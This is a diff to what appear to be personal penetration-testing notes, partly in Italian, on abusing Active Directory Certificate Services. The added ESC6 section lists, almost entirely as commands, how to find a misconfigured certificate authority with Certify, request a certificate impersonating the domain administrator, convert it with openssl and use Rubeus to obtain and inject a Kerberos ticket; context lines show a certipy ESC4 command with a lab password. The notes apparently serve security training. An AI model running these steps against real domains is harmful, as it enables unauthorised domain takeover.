@@ -69,6 +69,33 @@ Per riportarlo alla normalità
 certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
 ```
 ![[Pasted image 20230828151547.png]]
+
+### **ESC6**
+The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set.
+```cmd
+C:\AD\Tools\Certify.exe cas
+```
+![[Pasted image 20231115141409.png]]
+Look for a template that allow enrollment for normal user
+```cmd
+C:\AD\Tools\Certify.exe find
+```
+and request a certificate as any user you want using the "CA-integration" template
+```cmd
+C:\AD\Tools\Certify.exe request /ca:<DC.DOMAIN>\<CA> /template:"CA-Integration" /altname:<DOMAIN>\administrator
+```
+![[Pasted image 20231115142421.png]]
+Save it and convert it
+```cmd
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in <CERT> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <PFX>
+```
+![[Pasted image 20231115142542.png]]
+Now use it with Rubeus to gain access
+```cmd
+C:\AD\Tools\Rubeus.exe asktgt /user:<DOMAIN>\administrator /certificate:<PFX> /dc:<MACHINE> /password:<CHOOSEN PASSWORD> /ptt
+```
+![[Pasted image 20231115142707.png]]
+
 ### **Shadow Credentials**
 [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
 Stealth e molto utile in caso di vero pentest.
